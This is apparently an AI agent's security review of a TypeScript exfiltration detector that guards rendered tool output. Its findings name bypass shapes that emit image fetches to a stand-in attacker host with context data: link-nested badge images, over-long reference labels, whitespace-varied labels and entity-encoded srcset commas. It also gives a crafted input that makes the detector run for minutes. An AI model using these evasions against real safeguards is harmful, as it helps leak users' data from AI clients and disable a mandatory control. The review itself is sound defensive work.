STATUS: DONE_WITH_CONCERNS

# T72 — independent review of T71 (the repair of T66#F-001, T66#F-002, T66#F-003 on the auto-fetch floor)

Reviewer: independent (review-security-code + review-logic). I wrote none of the code, none of the
prior reviews and none of T71's or T66's probes. Every verdict row below cites a probe I wrote and
executed, with a raw log path under `.metaproject/data/gdctx/raw/`.

## Scope

- Branch `codex/agent-first-core`; base commit `0bc6418fa1a038f8ec909cf949fecba077acf9a4`. Every file
  under review is **uncommitted** in the main checkout `/Users/Goodea/goodea/keryx`. No worktree was
  entered, no `git stash`, no git or flow state change of any kind.
- Artifacts read in full: `T66-review.md`, `T71-spec.md`, `T71-implementation.md`,
  `T46-implementation.md` (the surface work T71 corrects), `T73-spec.md` (to confirm the concurrent
  task does not touch this file — it does not), `review-security-code/SKILL.md`,
  `review-logic/SKILL.md`, `docs/requirements/keryx-agent-first-core/policies.md`, the flow's
  `acceptance-criteria.md`.
- Code read line by line: `src/security/detect/exfil.ts` (all 1198 lines),
  `src/security/detect/exfil.test.ts` (targeted), `src/security/detect/index.ts`,
  `src/security/redact.ts`, `src/mcp/dispatch.ts`, `src/security/persistence-sinks.test.ts`.

### File hashes (SHA-256), start (18:34Z) and end (19:0xZ) — **NO DRIFT**

| File | Start | End |
|---|---|---|
| `src/security/detect/exfil.ts` | `ef029fe36b4f81f224b4b2de4d5ad21ae724ba06de47c67039a4912091efed8a` | unchanged |
| `src/security/detect/exfil.test.ts` | `7953c64ea57c470ebc1603897fb0e02c1f4821fed472ba6d7554584a84badd48` | unchanged |
| `src/security/detect/index.ts` | `a509312d76e7771ec5d9b059207019bde8736ebf26131bc82b595f838bd79c0d` | unchanged |
| `src/security/redact.ts` | `b8e9d9a5ca35f78127096bd7f1880669859b6d1ebd6e30151070a4d75bd44b86` | unchanged |
| `src/mcp/dispatch.ts` | `f1db21b0872c7bb46b4ac09819f9676ed0fd1609652f8caf978640497b6f6f18` | unchanged |
| `src/security/persistence-sinks.test.ts` | `f00899ef34d08b7c3cf2cbe5f083a4cbfb09feac1b49855897ed27976f716ad1` | unchanged |
| `docs/requirements/keryx-agent-first-core/policies.md` | `024d1d039921c5e840d144b26ae994e85e8bfa8b59eefb9798ed8b45295beb97` | unchanged |
| `fixtures/exfil/cases.json` | `2f131992fa84c7be3fd299641a0c36e48424c4bf678906b86052c338402eeb4f` | unchanged |
| flow `acceptance-criteria.md` | `fc255c571b594e18e5517e9105b5b049407b97c5db2d9d58a48f98689f4f21c9` | unchanged |

The start hash of `exfil.ts`, `exfil.test.ts` and `policies.md` equals the **after** hash T71 records
in its own change table, so every measurement below was taken against exactly the tree T71 delivered,
and nothing moved under me. Raw: `.T72-hashes-start.txt` / `.T72-hashes-end.txt` in this directory.

## Summary

| Severity | Count |
|---|---|
| blocker | 3 |
| major | 3 |
| minor | 1 |
| info | 1 |
| **total** | **8** |

Both dispatched blockers **are** closed — the decode fix is correct and complete for the class it
names, and the three CommonMark forms are covered. But the same shape the previous six rounds found is
here again, twice: **a layer judging text in a form the renderer does not use.** T71 wrote a bound it
calls "the standard's", and `marked` does not honour it, so a reference label of 1000 characters is
released — an input **the old patterns flagged**, which falsifies the strict-superset claim outright.
And the new scanner resolves `[![alt](URL)](href)` — the README badge idiom, an image nested in a link
— as a link and skips the image inside it, releasing an auto-fetch a renderer performs. Separately, the
mandatory floor has a **263-second response to a 12.5 KB payload** on a shape T71's own perf probe did
not include, where the shipped code is ~2× slower than the two patterns it replaced.

---

## Stage 1 — one row per item in the dispatch

| # | Row | Verdict | What my own work found |
|---|---|---|---|
| 1 | The decoded gate comparison | **PASS** | All **9** spellings closed at the detector and at all four public boundaries (`dispatchCallTool`, `prepareOutputForPersistence`, `validateOutputForTransport`, `redactToolOutput`): T66's seven plus two I added (`&#0000105;` zero-padded, and an **unquoted** value `type=&#105;mage` — the tokenizer decodes in that state too). `hostileFullyClosed: 14`, `state:"redacted"`, `isError:false`, no host at any boundary. Exact matching survived: all five negatives (`refresh&#59;`, `&#105;mages`, `type=text`, `content-type`, no `type`) stay `state:"none"` with 0 findings. Masking still lands on the **raw** bytes — `<input type="&#105;mage" src="[REDACTED:url]">` keeps the gate's own spelling byte-for-byte. Deciding in `hasAttributeValue` rather than at the two call sites is **right**: I enumerated every branch in the HTML loop that consults an attribute (8 branches) and every one that reads a VALUE either decodes or is name-keyed — with one exception, the `srcset` candidate split, which is a value **grammar** run on raw bytes and is a real allowlist-conditional bypass (F-004). Evidence: `T72-boundary.log`, `T72-gates.log`, `T72-srcset.log`. |
| 2 | The markdown scanner | **FAIL** | The superset claim is **false**. Two classes, both renderer-confirmed with `marked`: (a) **the 999-character label bound releases what the old pattern flagged** — `![a][<1000 chars>]` with its definition renders `<img src="attacker.invalid…">` in `marked`, the old unbounded `REFERENCE_USE` flagged it, the new `MAX_REFERENCE_LABEL` gate does not (F-002); (b) **an image nested in a link** — `[![badge](URL)](href)`, the README badge idiom, in five spellings, all released with `state:"none"` at all four boundaries (F-001). A 120 000-case differential fuzz against a reconstruction of the two old patterns found **0** superset violations in the shapes its alphabet can reach, which is exactly why the claim needed the two targeted shapes it cannot. The four link spellings and the reference-definition line **are** still released (verified independently in two probes). The label bound is **not** the only bound in effect: the two-candidate `descriptionEnds` plus "first inline wins, resume past the whole construct" is a resolution rule that releases (b). Evidence: `T72-md.log`, `T72-md-diff.log`, `T72-boundary.log`. |
| 3 | Documentation parity | **PARTIAL** | Re-derived, not re-run: I transcribed lines 28/30/32/34/36/38 of `policies.md` myself into 38 covered, 25 released and 14 property fragments and asked the detector. **All 72 list rows and all 14 property rows hold in both directions** — nothing the document calls covered is released, nothing it calls released is flagged, and the reader is now told the truth about case-insensitivity (`<Video src>`, `<IMG SRC>` flagged), about the three departures (quoted attribute value not a finding; unterminated value swallows the rest; `<base href>` flagged inside a comment **and** inside a fence, which is what the corrected wording claims), and about what the base element does. That is a real improvement over what T66 found. The one thing that does **not** hold is the one T66#F-003(a) required: *«перечень полный, не пример»* is still false — 5 reverse-completeness rows released, 4 of them renderer-confirmed (F-006). Evidence: `T72-doc.log`. |
| 4 | Nothing regressed | **PASS** | All eleven matrices re-run by me reproduce the recorded values, and **nine of them are byte-identical to T66's own raw logs by SHA-256**, not merely equal in summary: `T42-exfil-attack` `0646c508…`, `T24-recheck2-exfil` `8c9bfec0…`, `T42-charrefs` `698d8899…`, `T53-extract` `ad20286b…`, `T53-resolve` `06037910…`, `T53-boundary` `398012ce…`, **`T42-boundary` `7030455d…`**, **`T24-recheck2-boundary` `83839962…`**, `T52-base` `a04404db…`. The two the dispatch names — the canonicalization rows and the persistence signal — are among them: `T42-boundary` ROW 3's `signalMatrix` is character-for-character the value recorded in `T42-review.md:261-264`, and `T24-recheck2-boundary` shows 0 leaking with every reason token unchanged. `T53-base` differs from T66's log only by `[g07, g08]`, which is T67's `<base>` inert-span revert and which T71 disclosed. Corpus: **16** benign files with findings, **60** benign findings, the same file list, no new policy id; Part B **7 flagged, the same 7 ids**. Focused suites 102 pass / 0 fail / 980 expect(), matching T71 exactly. Evidence: `T72-rerun-*.log`. |

---

## Judgement calls

### 1. The performance measurement: **the numbers are honest, the generalisation is not, and the shipped floor still has a pathological input — blocker**

T71's three headline numbers reproduce for the shape T71 measured. I re-measured on the same 200 000-`[`
run: shipped **51.5 ms**, the two replaced patterns **41 046.7 ms** (T71 recorded 36.6 ms and
42 105.5 ms). Finding and fixing the quadratic first draft, and disclosing all three numbers so a
reviewer could check rather than take them, is exactly right and I would not want it done differently.

What is not right is the conclusion drawn from one shape. I scaled twelve shapes and reported the growth
exponent per doubling. `openBracketRun` is sub-linear (0.73) as claimed. But:

- **`![a](` followed by a run of non-`)` bytes** — an unterminated inline destination — is quadratic
  (exponent **1.99**): 100 KB costs **10 508 ms**. `INLINE_DESTINATION`'s `[^)\s]+[^)]*\)` backtracks
  over every split of the run. T71 did not touch that sub-pattern, but it did not measure it either.
- Combined with a leading run of `[`, it becomes **cubic** (exponent ~3.0), because the first `]` in
  `![a]` makes every preceding `[` reach the same `(` and pay the whole quadratic cost again:
  **12 505 bytes → 263 049.7 ms.** Four and a half minutes, inside a floor that runs on every payload,
  from a 12 KB paste.
- On that shape the shipped code is measured **~2× SLOWER** than the two patterns it replaced
  (1 054.5 ms vs 527.8 ms at 2 KB; 31 703.6 ms vs 14 395.9 ms at 6 KB), because the scanner now offers
  the destination regex a start position at every `[`, where the old pattern's `\[[^\]]*\]\(` had to
  align first. So T71-implementation's Concern 3 — *"The shipped shape is faster than what it replaces
  on the same input"* and *"the floor as a whole is still linear-per-file"* — is false in both halves,
  as a statement about the floor rather than about that one input.
- It is not only adversarial: an ordinary 40 KB tool output carrying one unterminated markdown image
  costs **1 660 ms**.

Treated as the security property the dispatch asks for, this is availability failure in a mandatory
control: the attacker chooses the payload, the floor cannot be skipped, and the acceptance criterion
says *no pathological input inside the floor*. **Blocker (F-003).** The cost is not intrinsic — the
destination grammar is a possessive/atomic-match problem, and a cheap `indexOf(")")` precondition before
running `INLINE_DESTINATION` removes the whole class.

### 2. The nesting over-approximation past depth 1: **right, and honestly labelled**

`marked` resolves one level of bracket nesting in a description; my own probe confirms it —
`![a[b]c](URL)` renders an `<img>` and `![a[b[c[d]e]f]g](URL)` does not, while the detector flags both
(`T72-md.log`, rows `ctlNestedBrackets` and `ctlDepth3`). So the depth-2..6 rows genuinely cannot be
confirmed by the oracle available in this checkout.

Over-approximating there is the correct direction and the labelling is honest. The alternative is a
depth bound, and this file's own history is the argument: a decoder bounded by digit count and an
extractor bounded by a negated character class were each defeated by writing one more of whatever was
bounded. The disclosure names the limitation as over-approximation rather than dressing it as a renderer
claim, says which oracle would settle it, and the cost is a masked destination in markup no measured
renderer fetches. **Accept, as recorded.** The irony worth stating for the next round: T71 avoided the
depth bound and then wrote a *length* bound three lines away that fails in exactly the way it feared
(F-002) — the discipline was right and was applied to only one of the two grammars.

### 3. The `Version:` bump outside the owned subsection: **acceptable**

`0.1.2 → 0.1.3` on a document whose normative content changed is the convention T46 set and is the
minimum honest signal that the package a reader may have cached is stale; leaving it would have been
the worse error. It is one line, in the document T71 legitimately owns a subsection of, disclosed in
both the spec and the implementation report before it was made rather than found afterwards, and the
adjacent credential-locator sentence T46 offered to change was correctly left alone. Accept. (Note it
must be bumped **again** when F-001/F-002/F-006 are fixed, since the completeness sentence changes.)

---

## Findings

### F-001 — blocker — an image nested inside a link is released; the README badge idiom is a zero-click channel

- **file / line / symbol**: `src/security/detect/exfil.ts:994` (`detectExfil`, the inline pass's
  `.find((construct) => construct.kind === "inline")`), with `:992` (`isImage` read from the OUTER
  bracket's `!`), `:1000` and `:1036` (`BRACKET_OPEN.lastIndex = inline.end`).
- **problem**: for `[![alt](URL)](href)`, `readBracketConstructs` on the outer `[` returns two inline
  readings — the balanced end yields `(href)`, the first-`]` end yields `(URL)`. `.find` takes the
  first, i.e. the OUTER one; `isImage` is `false` because the outer bracket carries no `!`, so the
  construct is treated as a click-gated LINK; and `BRACKET_OPEN.lastIndex = inline.end` then advances
  past the entire construct, so the inner `![alt](URL)` is never scanned by either pass. CommonMark does
  not resolve it that way: a link's text may contain an image, and the image renders. This is not the
  T71 spec's stated rule ("an inline destination wins over a definition of the same label") — that rule
  is about a *reference* use; here it silently discards a *nested inline image*.
- **impact**: `marked` emits `<img src="https://attacker.invalid/p?ctx=CTX">` for five measured
  spellings — inline, in prose, in a list, with an angle-bracket destination, with the image written as
  a shortcut or full reference — and all five return from `dispatchCallTool` with `isError:false` and
  **`redaction.state:"none"`**, pass `prepareOutputForPersistence` and `validateOutputForTransport`
  **byte-identical**, and reach the seam with the attacker host present. The carrier is the single most
  common markdown shape in existence: `[![build](badge)](ci-link)` opens a large fraction of all
  READMEs, and a model client rendering tool output fetches it with no click. This is a spelling bypass
  of a surface AC5 requires closed and `policies.md:28` declares complete.
- **reproduction**: `bun …/T72-md.ts` → `rendererConfirmedBypasses` includes `linkedInlineImage`,
  `linkedInlineImageNoBang`, `linkedShortcutImage`, `linkedFullRefImage`, `linkedInlineImageProse`
  (raw `T72-md.log`). Boundaries: `bun …/T72-boundary.ts` → `leakingWithStateNone` includes
  `x1LinkedInlineImage`, `x2LinkedShortcutImage`, `x3LinkedImageInProse` (raw `T72-boundary.log`).
  Real-world carrier: `bun …/T72-extra.ts` → `badgeRow rendererImgSrcs=["https://attacker.invalid/…",
  "https://cdn.example.org/cov.svg"] detectorFindings=0` (raw `T72-extra.log`).
- **suggested_fix**: do not let an outer inline construct suppress the interior. Two changes at the
  same place: (a) when the chosen inline construct's description contains a `!`-prefixed bracket run,
  do not advance `BRACKET_OPEN.lastIndex` past it — advance to `open + 1` so the interior is rescanned;
  (b) alternatively, and more faithfully, prefer the reading whose description contains no nested
  construct (CommonMark's "inner-most wins" for links), which makes the inner image the flagged one and
  leaves the outer link click-gated as it should be. Either way add `[![a](U)](L)` to
  `T71_CLASS_VECTORS`, since the boundary regressions do not currently reach it.
- **class_scope**: sites: `src/security/detect/exfil.ts:991-1013` (inline pass), `:1027-1054`
  (reference pass — the same `inline` short-circuit at `:1031-1038`),
  `docs/requirements/keryx-agent-first-core/policies.md:28` (the completeness claim). Enumeration
  method: every CommonMark shape in which a covered construct can be *contained* by another bracket
  construct was enumerated (image-in-link, image-in-image, link-in-image) and each driven through
  `marked` and `detectExfil` in `T72-md.ts` / `T72-md-diff.ts`; image-in-image (`imageInsideImage`) is
  correctly resolved to the outer destination and is NOT a member, so the class is image-in-link, in
  all four image spellings.

### F-002 — blocker — `MAX_REFERENCE_LABEL` releases a reference image the OLD pattern flagged, so the strict-superset claim is false

- **file / line / symbol**: `src/security/detect/exfil.ts:565` `MAX_REFERENCE_LABEL`, applied at
  `:611-615` (`usable`).
- **problem**: the bound is justified as *"the STANDARD's bound, not a bound invented here … a longer
  bracket run cannot be a label in any conformant renderer"*. Measured against the renderer this flow
  uses as its markdown oracle, that is not true: `marked` resolves a 1000- and a 1200-character label
  and emits the `<img>`. The 999-character limit is a CommonMark conformance rule that real renderers
  (marked, and GitHub's) do not enforce, and the threat model here is *the rendering client*, not the
  specification. Worse, `REFERENCE_DEF` (`:557`) has **no** matching bound, so the definition side
  still builds the entry the use side then refuses to look up — the two halves disagree.
- **impact**: two counts. (1) **The superset claim fails**: the old `REFERENCE_USE`'s label group was
  `([^\]]+)`, unbounded, and flagged `![a][<1000 chars>]`; the new scanner releases it. T71's central
  argument for replacing the patterns — *"no over-approximation the 88-case extraction matrix records
  can therefore vanish"* — is true of the description grammar and false of the label grammar, and the
  88-case matrix does not contain a long label so it could not have caught this. (2) It is the seventh
  instance of this file's recurring failure: a bound placed on the judgement, defeated by writing one
  more of whatever was bounded. Full/collapsed/shortcut forms are all affected; all reach the client
  with `state:"none"` at all four boundaries.
- **reproduction**: `bun …/T72-md-diff.ts` → `supersetRegressions: [label1000, label1200]` and
  `rendererConfirmedBypasses` additionally `[shortcut1000, collapsed1000]`; `label998` and `label999`
  are flagged, so the cliff is exactly at the constant (raw `T72-md-diff.log`). Boundaries:
  `T72-boundary.log` → `leakingWithStateNone` includes `x4LongLabelFullRef`, `x5LongLabelShortcut`.
- **suggested_fix**: remove the bound from the classification path, or raise it to whatever the
  renderer actually does — the honest form is no bound at all, because the label is only used as a Map
  key and an over-long key simply fails to match unless a definition of the same over-long label exists,
  which is precisely the case a renderer fetches. If a bound is kept for the performance reason the
  comment also gives, apply the SAME bound to `REFERENCE_DEF` so the two halves agree, and state that it
  is a cost bound whose failure direction is release. No test pins the current bound (verified:
  `ctx rg "MAX_REFERENCE_LABEL|999" src/security/detect/exfil.test.ts` → 0 hits on the constant), so
  removing it breaks nothing.
- **class_scope**: sites: `src/security/detect/exfil.ts:565` (the constant), `:611-615` (the `usable`
  gate — the only reader), `:557` `REFERENCE_DEF` (the unbounded other half). Enumeration method: every
  numeric or length bound introduced by T71 was located by reading the new code in full; there is
  exactly one (`MAX_REFERENCE_LABEL`), and it was then swept at 998/999/1000/1200 characters against
  `marked` and against the reconstructed old pattern in `T72-md-diff.ts`.

### F-003 — blocker — the mandatory floor takes 263 seconds on a 12.5 KB payload, and is ~2× slower than what it replaced on that shape

- **file / line / symbol**: `src/security/detect/exfil.ts:551` `INLINE_DESTINATION`, executed at
  `:588` once per candidate description end, i.e. up to twice per `[` in the input.
- **problem**: `\(\s*(?:<([^<>\n]*)>|([^)\s]+))[^)]*\)` backtracks over every split of a run of
  non-`)` bytes, so one unterminated inline destination is quadratic in the run length. T71 replaced a
  per-open depth walk with an O(n) bracket index and measured that shape only; the destination grammar
  was carried over untouched, and the new scanner now offers it a start position at **every** `[`,
  where the old `\[[^\]]*\]\(` had to align first. The two costs multiply.
- **impact**: measured on the shipped detector. `![a](` + a 100 000-byte non-`)` run: **10 508 ms**,
  growth exponent **1.99**. `"[".repeat(6250) + "![a](" + "A".repeat(6250)` — **12 505 bytes** —
  **263 049.7 ms**, growth exponent ~3.0. A realistic 40 KB tool output with one unterminated markdown
  image: **1 660 ms**. On the cubic shape the shipped code is consistently slower than the two patterns
  it replaced (1 054.5 vs 527.8 ms at 2 KB; 31 703.6 vs 14 395.9 ms at 6 KB). The floor is mandatory and
  cannot be skipped, and the payload is attacker-chosen — this is a denial-of-service surface in a
  security control, and it also falsifies T71-implementation Concern 3's two claims.
- **reproduction**: `bun …/T72-perf.ts` → `shapesOverOneSecond: [unterminatedDestination=10508ms,
  unterminatedDestinationAngle=10182.3ms, openRunThenUnterminated=263049.7ms]`,
  `superLinearShapes` with exponents (raw `T72-perf.log`); `bun …/T72-perf2.ts` → the shipped-vs-old
  ladder and `realisticPayloadMs: 1660.3` (raw `T72-perf2.log`).
- **suggested_fix**: gate the destination regex on a cheap precondition before running it — if
  `content.indexOf(")", descriptionEnd)` is `-1`, no inline destination can match, so return
  immediately; and bound the regex's search window to that index. That is O(1) amortised with the
  bracket index already built and removes both the quadratic and the cubic shape. Then add the
  unterminated-destination shapes to `T71-perf.ts` so the next round measures them.
- **class_scope**: sites: `src/security/detect/exfil.ts:551` (`INLINE_DESTINATION`, the only
  backtracking destination grammar), `:557` `REFERENCE_DEF` (measured linear, `refDefRun` 18.2 ms at
  213 KB), `:749` `META_REFRESH_CONTENT` (terminates in `([\s\S]*)$`, no backtracking), `:642`
  `HTML_START_TAG` + `readStartTag` (measured linear, `htmlTagRun` 13.1 ms at 200 KB). Enumeration
  method: every regex and every loop in the module was scaled across five sizes from 12.5 KB to 400 KB
  in `T72-perf.ts` and the growth exponent computed per shape from the last two sizes; the three
  super-linear shapes are the class and all three are the same sub-pattern.

### F-004 — major — the `srcset` candidate split runs on the RAW value, so an entity-encoded comma hides a second candidate under a non-empty allowlist

- **file / line / symbol**: `src/security/detect/exfil.ts:1179` (`attribute.value.split(",")` in the
  `srcset` branch).
- **problem**: T71 closed the decode class at `hasAttributeValue` — the two gates that read an attribute
  value as a NAME-like token. The `srcset` branch reads an attribute value as a **grammar**, and it
  still parses the raw bytes. A renderer's tokenizer decodes the attribute value first
  (§13.2.5.35-.39 — the very premise the gate fix rests on) and only then runs "parse a srcset
  attribute", which splits on commas. So `srcset="https://cdn…/a.png&#44;https://attacker…/p 2x"` is
  ONE candidate to this detector and TWO to a renderer.
- **impact**: under the empty default allowlist the whole raw string still resolves to the first host
  and is masked, so the default posture is safe. Under a **non-empty** allowlist containing the first
  candidate's host — which is the documented remedy for every false positive in this floor, and the
  stated prerequisite for widening the deferred set — the finding disappears and the attacker candidate
  reaches the client. Measured on `<img srcset>` and `<source srcset>`, decimal and hex spellings.
- **reproduction**: `bun …/T72-srcset.ts` → three rows `verdict=BYPASS` with
  `allowlist=["cdn.example.org"]`, each printing the renderer's two candidates beside the detector's
  one (raw `T72-srcset.log`).
- **suggested_fix**: split the srcset on `decodeCharacterReferences(attribute.value)` and map each
  candidate's offset back to the raw span (the same raw/classify separation `UrlHit.classify` already
  provides for `<meta refresh>`), or — simpler and in this floor's own direction — when the decoded
  value contains a comma the raw value does not, classify every decoded candidate and mask the whole
  attribute value.
- **class_scope**: sites: `src/security/detect/exfil.ts:1179` (`srcset` split). Every other branch that
  consults an attribute was enumerated and is clean: `:1087`/`:1091` `hasAttributeValue` (decodes),
  `:1104` `metaRefreshDestination` (decodes), `:1139` `base/href` → `renderableUrl` (decodes), `:1157`
  `FETCHING_ATTRIBUTES[attribute.name]` (a NAME, which a tokenizer does not decode — confirmed:
  `<img sr&#99;=…>` produces no `src` attribute for lol-html either), `:1094` the empty-value skip
  (a raw-empty value cannot decode to a non-empty one). Enumeration method: `detectExfil`'s HTML loop
  (`exfil.ts:1059-1195`) read line by line, each attribute-consulting branch turned into a row in
  `T72-gates.ts` with the question "does a renderer decode this before reading it".

### F-005 — major — reference labels are matched byte-exactly; CommonMark collapses internal whitespace, so `![a][b  c]` against `[b c]: URL` is released

- **file / line / symbol**: `src/security/detect/exfil.ts:1042`
  (`refs.get(construct.label.trim().toLowerCase())`), with `:974` (the definition side, same
  normalisation).
- **problem**: CommonMark's label matching normalises with Unicode case folding **and** by collapsing
  consecutive internal whitespace (including a newline) to a single space. The detector normalises with
  `trim().toLowerCase()` only. So a use whose label differs from its definition only in internal
  whitespace resolves for a renderer and not for the floor. Case folding is the half T71 got right —
  `![a][STRASSE]` against `[strasse]: URL` is flagged.
- **impact**: `marked` renders `<img src="https://attacker.invalid/…">` for `![a][b  c]` and for a
  label carrying a newline, while `detectExfil` returns 0 findings. Two more cheap spellings of a
  surface `policies.md` calls complete. Pre-existing (the old lookup normalised the same way), but T71
  rewrote this resolution and re-asserted completeness over it.
- **reproduction**: `bun …/T72-gates.ts` → `bypasses` includes `labelInnerWhitespace:BYPASS` and
  `labelNewlineInLabel:BYPASS`, each printing `marked`'s emitted `<img>` beside `detectorFindings=0`
  (raw `T72-gates.log`).
- **suggested_fix**: normalise both sides with CommonMark's rule — `label.trim().replace(/\s+/g, " ")`
  before `toLowerCase()`, applied identically at `:974` and `:1042`.
- **class_scope**: sites: `src/security/detect/exfil.ts:974` (definition side), `:1042` (use side).
  Enumeration method: CommonMark's "link label" matching rule has three components (case folding,
  internal-whitespace collapse, entity decoding); each was driven against `marked` and `detectExfil` in
  `T72-gates.ts`. Case folding passes; whitespace collapse fails at both sites; entity decoding is a
  non-member because `marked` does not resolve `![a][b&#99;]` either (row `labelEntitySpelling`).

### F-006 — major — `policies.md`'s *«перечень полный, не пример»* is still false, which is the one half of T66#F-003 the repair had to fix

- **file / line / symbol**: `docs/requirements/keryx-agent-first-core/policies.md:28`
  (`### Auto-fetch floor: покрытая и непокрытая область`, the covered list).
- **problem**: T66#F-003(a) said the completeness claim could stay only *after* the spelling gaps were
  closed. T71 kept the claim and widened the markdown entry to *«во всех четырёх написаниях
  CommonMark»*. Five shapes that a reader of that sentence would expect covered are released, four of
  them renderer-confirmed: an image inside a link in two spellings (F-001), a reference label past 999
  characters (F-002), a label differing by internal whitespace (F-005), and a `srcset` candidate behind
  an entity-encoded comma under a non-empty allowlist (F-004). Parts (b) and (c) of T66#F-003 **are**
  fixed and verified in both directions — this finding is only about (a).
- **impact**: the acceptance criterion "the recorded documentation matches the implementation in both
  directions" is not met. A normative document that overstates completeness is worse than the silence
  it replaced, because the next round trusts it instead of re-deriving — which is exactly what happened
  between T46 and T66.
- **reproduction**: `bun …/T72-doc.ts` → 77 rows, `docSaysReleasedButFlagged: []`,
  `propertyFailures: []`, and `docSaysCoveredButReleased: [revLinkedInlineImage,
  revLinkedShortcutImage, revLongLabelFullRef, revLabelWhitespace, revSrcsetCharrefComma]`,
  `parity: false` (raw `T72-doc.log`).
- **suggested_fix**: fix F-001/F-002/F-004/F-005 and keep the sentence; if any is deferred, replace
  *«перечень полный, не пример»* with a named exception list rather than dropping the claim entirely —
  the value of the subsection is that it is checkable. The same correction is owed to the module header
  block (`exfil.ts:10-21`), which now names "all three CommonMark spellings" with the same gap.
- **class_scope**: sites: `docs/requirements/keryx-agent-first-core/policies.md:28`,
  `src/security/detect/exfil.ts:10-21` (the module header's covered list, T66#F-003's third site).
  Enumeration method: both lists transcribed independently into 77 executable fragments in `T72-doc.ts`
  and put to the detector in both directions; the reverse-completeness block adds every shape this
  review measured released that the sentence implies is covered.

### F-007 — minor — T71-implementation's Concern 3 states two performance properties that are false as written

- **file / line / symbol**: `.metaproject/flows/…/artifacts/T71-implementation.md`, Concerns §3 (and
  the same claim in §"A performance defect the repair introduced", and `exfil.ts:488-496`).
- **problem**: *"The shipped shape is faster than what it replaces on the same input"* is true for the
  one input measured and false for the unterminated-destination shape, where it is ~2× slower.
  *"the floor as a whole is still linear-per-file"* is false: two measured shapes are quadratic and one
  is cubic. The module comment at `:488-496` repeats the first claim.
- **impact**: the disclosure is what a next round will read as the settled measurement, and it would
  conclude the performance question is closed. Recorded separately from F-003 because F-003 is about
  the code and this is about the artifact a future round inherits.
- **reproduction**: `T72-perf.log`, `T72-perf2.log` (as F-003).
- **suggested_fix**: after F-003 is fixed, restate the claim with the shape it applies to and record the
  measured exponents for the shapes that were not in the original eight.

### F-008 — info — `HTMLRewriter` is not a decoding oracle, and three rounds have described it as one

- **file / line / symbol**: `T66-gates.ts` / `T66-enum.ts` and their descendants (the
  `rendererFetches` / `oracle` columns), and the description of the oracle in `T66-review.md` and
  `T71-implementation.md`.
- **problem**: measured — Bun's `HTMLRewriter` (lol-html) returns the **raw** attribute source, not the
  tokenizer's decoded value: `getAttribute("type")` on `type="&#105;mage"` returns `&#105;mage`, and on
  `type="&amp;#105;mage"` returns `&amp;#105;mage`. It is a faithful oracle for *attribution* (which
  element owns which attribute) and for *tag boundaries*, which is what T53 and T66 used it for, but it
  cannot confirm the decoding premise that T66#F-001 and this whole repair rest on. That premise is
  sound and rests on the spec text (§13.2.5.35-.39), not on any oracle in this checkout.
- **impact**: none on any verdict — I stated the premise explicitly wherever I used it rather than
  attributing it to the oracle (`T72-srcset.ts` header). Recorded so the next round does not treat
  "an independent HTML tokenizer shipped with the runtime" as settling a decoding question, and so a
  future decode-related finding is not "confirmed" by a probe that cannot see decoding at all. A real
  decoding oracle would be a full parser (`parse5`, or `Response`→DOM), not a rewriter.
- **reproduction**: `bun …/T72-extra.ts` rows `singlePass` / `doubleEncoded` / `doubleEncodedMeta`
  (raw `T72-extra.log`).

---

## Confirmed clean areas

- **T66#F-001 is fully closed.** All nine gate spellings — decimal, hex, trailing, no-semicolon,
  zero-padded, and an unquoted attribute value — are flagged and masked at the detector and at all four
  public boundaries, with `isError:false` and `state:"redacted"`. Fixing it in `hasAttributeValue`
  rather than at the two call sites is the right choice and the enumeration behind it is correct: every
  other branch in the HTML loop is name-keyed or already decodes (F-004 is a value *grammar*, a
  different shape, not a third gate).
- **Exact matching survived.** `http-equiv="refresh&#59;"` (decodes to `refresh;`), `type="&#105;mages"`,
  `type=text`, a `content-type` meta and an `<input>` with no `type` are all released with 0 findings
  and `state:"none"` — no prefix or substring test was introduced.
- **Masking still lands on the raw bytes.** Five redaction outputs checked byte-for-byte: the gate's own
  spelling is preserved verbatim and only the destination span is replaced.
- **The three T66#F-002 markdown forms are genuinely covered**, at the detector and at all four
  boundaries: collapsed `![a][]`, shortcut `![a]`, and the balanced-bracket description `![a[b]c](URL)`,
  alongside the full and inline baselines.
- **The click-gated controls are still released**: all four markdown LINK spellings (inline, full,
  collapsed, shortcut) and a reference-definition line with no image use, verified in two independent
  probes. AC5's third clause holds — a public Markdown link is `state:"none"` and byte-identical at all
  four boundaries — and a relative image destination stays released.
- **The allowlist remedy works** on the covered rows (`allowlistRemedyWorks: true`).
- **Documentation parity in every direction except completeness**: 72 list rows and 14 property rows,
  0 mismatches. The three departures from context blindness are each true as written, including
  `<base href>` being flagged inside a comment and inside a fence; case-insensitivity is now stated and
  is true (`<Video src>`, `<Iframe src>`, `<Embed src>`, `<IMG SRC>` all flagged); the gate-decoding
  clause is true.
- **Nothing regressed.** Nine of eleven prior matrices are byte-identical to T66's own raw logs by
  SHA-256; the tenth differs only by T67's disclosed `<base>` revert; the eleventh (`T46-surfaces`) has
  no T66 hash to compare and reproduces T71's recorded values exactly. Benign corpus unchanged at 16
  files / 60 findings and Part B at the same 7 ids. Focused suites 102/0/980.
- **No existing test was weakened or removed**, and no test pins the `MAX_REFERENCE_LABEL` bound, so
  F-002 can be fixed without touching a regression.

## Evidence

All raw logs under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`. Probes under
`/Users/Goodea/goodea/keryx/.metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/`
(`T72-md.ts`, `T72-md-diff.ts`, `T72-boundary.ts`, `T72-gates.ts`, `T72-srcset.ts`, `T72-doc.ts`,
`T72-perf.ts`, `T72-perf2.ts`, `T72-extra.ts`).

| Log | SHA-256 |
|---|---|
| `T72-md.log` | `c9bb139f12cca2e8ecc288560e1957feb128a42c18b72269b452c7e9622a56bb` |
| `T72-md-diff.log` | `36735361593bf999cb4fcf1fb58cab9aa597054380b3023a6e9bc73c0eaa8a53` |
| `T72-boundary.log` | `9fca2528a722ce85a32c3cbe69a8d824c30320ae320bd774d3a317a2580255b3` |
| `T72-gates.log` | `adc010a85b6c03d5ca60af5c6f37ba22d416e2582a6424020acfef4bd6f3d83f` |
| `T72-srcset.log` | `7957eee55ca5f2f44c88e70806c89d3c370152c09a29ee6560f733abe18514ff` |
| `T72-doc.log` | `88d82662f2d56b6f8a8cb47e7d1850aa10765ba9d10408769a8becbdec2e543d` |
| `T72-perf.log` | `7ae822c6cb0c1c8f5ee168f5dffffe6a03380e3ff16db2f9b835e138e6ada8cd` |
| `T72-perf2.log` | `ddf594273c4f2db98749b41a79feef9f14459ce07807df0f5c4395289904a2fa` |
